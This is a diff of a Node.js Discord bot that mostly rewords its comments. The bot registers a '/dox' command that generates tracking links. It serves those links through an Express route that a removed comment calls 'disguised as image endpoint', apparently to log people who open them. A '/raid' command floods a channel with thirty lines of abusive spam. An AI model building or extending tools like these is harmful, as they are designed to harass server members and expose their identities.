@@ -10,11 +10,10 @@ const WEBHOOK_URL = process.env.WEBHOOK_URL;
 const INVITE_LINK = process.env.INVITE_LINK || 'https://discord.gg/hW3djeNKu';
 const PORT = process.env.PORT || 3000;
 
-// ---- MINIMAL INTENTS ----
+// ---- MINIMAL INTENTS (no MessageContent needed) ----
 const client = new Client({
     intents: [
         GatewayIntentBits.Guilds,
-        GatewayIntentBits.MessageContent,
         GatewayIntentBits.GuildMessages
     ],
 });
@@ -22,7 +21,7 @@ const client = new Client({
 // ---- STORE ACTIVE LINKS ----
 const links = new Map();
 
-// ---- EXPRESS SERVER (disguised as image endpoint) ----
+// ---- EXPRESS SERVER ----
 app.get('/img/:id.png', (req, res) => {
     const id = req.params.id;
     console.log(`🔍 Requested ID: ${id}`);
@@ -47,7 +46,6 @@ app.listen(PORT, () => {
 client.once('ready', () => {
     console.log(`🤖 Logged in as ${client.user.tag}`);
     
-    // Register slash commands
     const commands = [
         { name: 'dox', description: 'Generate a fresh link' },
         { name: 'raid', description: 'Flood the channel with a raid message' },
@@ -56,7 +54,7 @@ client.once('ready', () => {
     
     commands.forEach(cmd => {
         client.application.commands.create(cmd)
-            .then(() => console.log(`✅ Slash command registered: /${cmd.name}`))
+            .then(() => console.log(`✅ /${cmd.name} registered`))
             .catch(err => console.error(`❌ Failed to register /${cmd.name}:`, err));
     });
 });
@@ -64,7 +62,7 @@ client.once('ready', () => {
 client.on('interactionCreate', async (interaction) => {
     if (!interaction.isChatInputCommand()) return;
 
-    // ---- DOX COMMAND ----
+    // ---- DOX ----
     if (interaction.commandName === 'dox') {
         await interaction.deferReply({ ephemeral: true });
 
@@ -88,7 +86,7 @@ client.on('interactionCreate', async (interaction) => {
         await interaction.editReply({ embeds: [embed] });
     }
 
-    // ---- RAID COMMAND ----
+    // ---- RAID ----
     if (interaction.commandName === 'raid') {
         await interaction.deferReply({ ephemeral: true });
 
@@ -97,7 +95,6 @@ client.on('interactionCreate', async (interaction) => {
             return interaction.editReply('❌ This command can only be used in a server channel.');
         }
 
-        // Build the raid message
         const spamLines = [];
         for (let i = 0; i < 30; i++) {
             spamLines.push('THIS SERVER FUCKING SUCKS PULSE OWNS ALL OF YOU');
@@ -106,7 +103,6 @@ client.on('interactionCreate', async (interaction) => {
         
         const raidMessage = spamLines.join('\n');
 
-        // Send the raid message (split into chunks if needed)
         try {
             await channel.send(raidMessage);
             await interaction.editReply('✅ Raid sent successfully.');
@@ -116,7 +112,7 @@ client.on('interactionCreate', async (interaction) => {
         }
     }
 
-    // ---- INVITE COMMAND ----
+    // ---- INVITE ----
     if (interaction.commandName === 'invite') {
         const embed = new EmbedBuilder()
             .setTitle('📩 Invite Pulse')
@@ -128,7 +124,7 @@ client.on('interactionCreate', async (interaction) => {
     }
 });
 
-// ---- CLEANUP OLD LINKS ----
+// ---- CLEANUP ----
 setInterval(() => {
     const keys = Array.from(links.keys());
     if (keys.length > 100) {
